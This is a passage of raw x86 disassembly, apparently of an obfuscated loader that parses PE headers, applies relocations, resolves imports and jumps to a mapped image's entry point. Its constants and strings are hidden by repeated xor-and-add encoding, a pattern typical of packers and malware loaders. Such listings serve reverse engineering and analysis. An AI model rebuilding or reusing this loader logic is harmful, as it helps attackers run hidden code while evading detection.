  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
  425dda:	mov    DWORD PTR [ebp+0xc],eax
  425ddd:	mov    eax,DWORD PTR [ebp-0x4]
  425de0:	mov    ecx,DWORD PTR [ebp-0x14]
  425de3:	xor    eax,esi
  425de5:	add    eax,edi
  425de7:	cmp    eax,ecx
  425de9:	je     0x425e14
  425deb:	mov    eax,DWORD PTR [ebp-0x4]
  425dee:	mov    ecx,DWORD PTR [ebp-0x14]
  425df1:	xor    eax,esi
  425df3:	add    eax,edi
  425df5:	shr    ecx,0x1f
  425df8:	cmp    eax,ecx
  425dfa:	je     0x425e14
  425dfc:	mov    ecx,DWORD PTR [ebp-0x14]
  425dff:	mov    eax,DWORD PTR [ebp+0x10]
  425e02:	mov    eax,DWORD PTR [eax+0x1e0]
  425e08:	movzx  ecx,cx
  425e0b:	push   ecx
  425e0c:	push   DWORD PTR [ebp-0xc]
  425e0f:	call   DWORD PTR [eax+0x8]
  425e12:	jmp    0x425e2d
  425e14:	mov    eax,DWORD PTR [ebp+0xc]
  425e17:	add    eax,DWORD PTR [ebp+0x8]
  425e1a:	mov    ecx,DWORD PTR [ebp+0x10]
  425e1d:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425e23:	add    eax,0x2
  425e26:	push   eax
  425e27:	push   DWORD PTR [ebp-0xc]
  425e2a:	call   DWORD PTR [ecx+0x8]
  425e2d:	mov    DWORD PTR [ebp+0xc],eax
  425e30:	mov    eax,DWORD PTR [ebp-0x4]
  425e33:	mov    ecx,DWORD PTR [ebp+0xc]
  425e36:	xor    eax,esi
  425e38:	add    eax,edi
  425e3a:	cmp    eax,ecx
  425e3c:	mov    eax,DWORD PTR [ebp-0x8]
  425e3f:	jne    0x425e52
  425e41:	mov    ecx,DWORD PTR [ebp-0x18]
  425e44:	xor    eax,esi
  425e46:	lea    eax,[ecx+eax*1+0x3272f6]
  425e4d:	mov    DWORD PTR [ebp-0x18],eax
  425e50:	jmp    0x425e62
  425e52:	mov    ecx,DWORD PTR [ebp+0xc]
  425e55:	xor    eax,esi
  425e57:	add    eax,edi
  425e59:	imul   eax,ecx
  425e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e5f:	mov    DWORD PTR [ecx+ebx*4],eax
  425e62:	mov    eax,DWORD PTR [ebp-0x8]
  425e65:	xor    eax,esi
  425e67:	lea    ebx,[ebx+eax*1+0x3272f6]
  425e6e:	mov    eax,DWORD PTR [ebp-0x4]
  425e71:	mov    ecx,DWORD PTR [ebp-0x1c]
  425e74:	xor    eax,esi
  425e76:	add    eax,edi
  425e78:	cmp    DWORD PTR [ecx+ebx*4],eax
  425e7b:	jne    0x425dac
  425e81:	mov    edx,DWORD PTR [ebp-0x10]
  425e84:	mov    eax,DWORD PTR [ebp-0x18]
  425e87:	mov    ecx,DWORD PTR [ebp-0x2c]
  425e8a:	sub    edx,0x3272f5
  425e90:	xor    edx,esi
  425e92:	jmp    0x425c5c
  425e97:	mov    ecx,DWORD PTR [ebp-0x4]
  425e9a:	xor    ecx,esi
  425e9c:	add    ecx,edi
  425e9e:	cmp    eax,ecx
  425ea0:	mov    eax,DWORD PTR [ebp-0x4]
  425ea3:	jne    0x425ead
  425ea5:	mov    eax,DWORD PTR [ebp-0x8]
  425ea8:	jmp    0x425ead
  425eaa:	mov    eax,DWORD PTR [ebp-0x4]
  425ead:	xor    eax,esi
  425eaf:	add    eax,edi
  425eb1:	pop    edi
  425eb2:	pop    esi
  425eb3:	pop    ebx
  425eb4:	leave  
  425eb5:	ret    0xc
  425eb8:	push   ebp
  425eb9:	mov    ebp,esp
  425ebb:	sub    esp,0x28
  425ebe:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  425ec5:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  425ecc:	mov    eax,DWORD PTR [ebp+0xc]
  425ecf:	mov    DWORD PTR [ebp+0xc],eax
  425ed2:	push   esi
  425ed3:	mov    eax,eax
  425ed5:	mov    eax,DWORD PTR [ebp-0x4]
  425ed8:	mov    esi,DWORD PTR [ebp+0x8]
  425edb:	mov    ecx,0x75108af
  425ee0:	xor    eax,ecx
  425ee2:	mov    edx,0x3272f6
  425ee7:	add    eax,edx
  425ee9:	cmp    esi,eax
  425eeb:	je     0x426012
  425ef1:	mov    eax,DWORD PTR [ebp+0x8]
  425ef4:	mov    esi,DWORD PTR [ebp+0x8]
  425ef7:	add    esi,DWORD PTR [eax+0x3c]
  425efa:	push   edi
  425efb:	mov    DWORD PTR [ebp+0xc],esi
  425efe:	mov    DWORD PTR [ebp-0x1c],0xf89c85a0
  425f05:	mov    eax,DWORD PTR [ebp-0x1c]
  425f08:	mov    esi,DWORD PTR [ebp-0x4]
  425f0b:	mov    edi,DWORD PTR [ebp+0xc]
  425f0e:	xor    esi,ecx
  425f10:	xor    eax,ecx
  425f12:	add    esi,edx
  425f14:	cmp    DWORD PTR [edi+eax*8+0x1939828],esi
  425f1b:	je     0x42600c
  425f21:	mov    esi,DWORD PTR [ebp+0xc]
  425f24:	mov    eax,DWORD PTR [ebp+0x8]
  425f27:	add    eax,DWORD PTR [esi+0xa0]
  425f2d:	mov    esi,DWORD PTR [ebp+0x8]
  425f30:	mov    edi,DWORD PTR [ebp+0xc]
  425f33:	sub    esi,DWORD PTR [edi+0x34]
  425f36:	mov    edi,DWORD PTR [ebp-0x4]
  425f39:	xor    edi,ecx
  425f3b:	add    edi,edx
  425f3d:	mov    DWORD PTR [ebp-0x24],esi
  425f40:	cmp    esi,edi
  425f42:	je     0x42600c
  425f48:	mov    esi,DWORD PTR [ebp-0x4]
  425f4b:	xor    esi,ecx
  425f4d:	add    esi,edx
  425f4f:	mov    DWORD PTR [ebp-0x8],esi
  425f52:	push   ebx
  425f53:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  425f5a:	jmp    0x425ff6
  425f5f:	mov    esi,DWORD PTR [ebp-0x4]
  425f62:	xor    esi,ecx
  425f64:	lea    edi,[ebx-0x8]
  425f67:	add    esi,edx
  425f69:	shr    edi,1
  425f6b:	cmp    esi,edi
  425f6d:	jae    0x425fdc
  425f6f:	sub    edi,esi
  425f71:	lea    ebx,[eax+esi*2+0x8]
  425f75:	mov    DWORD PTR [ebp-0x18],edi
  425f78:	movzx  esi,WORD PTR [ebx]
  425f7b:	and    esi,0xfff
  425f81:	mov    DWORD PTR [ebp-0x14],esi
  425f84:	mov    edi,DWORD PTR [ebp-0x14]
  425f87:	mov    esi,DWORD PTR [eax]
  425f89:	sub    esi,edx
  425f8b:	add    edi,esi
  425f8d:	movzx  esi,WORD PTR [ebx]
  425f90:	shr    esi,0xc
  425f93:	xor    edi,ecx
  425f95:	mov    DWORD PTR [ebp-0x20],edi
  425f98:	mov    DWORD PTR [ebp-0x14],esi
  425f9b:	mov    esi,DWORD PTR [ebp-0x20]
  425f9e:	mov    edi,DWORD PTR [ebp+0x8]
  425fa1:	xor    esi,ecx
  425fa3:	lea    esi,[esi+edi*1+0x3272f6]
  425faa:	mov    DWORD PTR [ebp-0x20],esi
  425fad:	mov    esi,DWORD PTR [ebp-0x10]
  425fb0:	mov    edi,DWORD PTR [ebp-0x14]
  425fb3:	xor    esi,ecx
  425fb5:	add    esi,edx
  425fb7:	cmp    edi,esi
  425fb9:	jne    0x425fd1
  425fbb:	mov    esi,DWORD PTR [ebp-0x10]
  425fbe:	mov    edi,DWORD PTR [ebp-0x14]
  425fc1:	xor    esi,ecx
  425fc3:	add    esi,edx
  425fc5:	cmp    edi,esi
  425fc7:	jne    0x425fd1
  425fc9:	mov    esi,DWORD PTR [ebp-0x20]
  425fcc:	mov    edi,DWORD PTR [ebp-0x24]
  425fcf:	add    DWORD PTR [esi],edi
  425fd1:	add    ebx,0x2
  425fd4:	dec    DWORD PTR [ebp-0x18]
  425fd7:	jne    0x425f78
  425fd9:	mov    ebx,DWORD PTR [ebp-0xc]
  425fdc:	add    DWORD PTR [ebp-0x8],ebx
  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
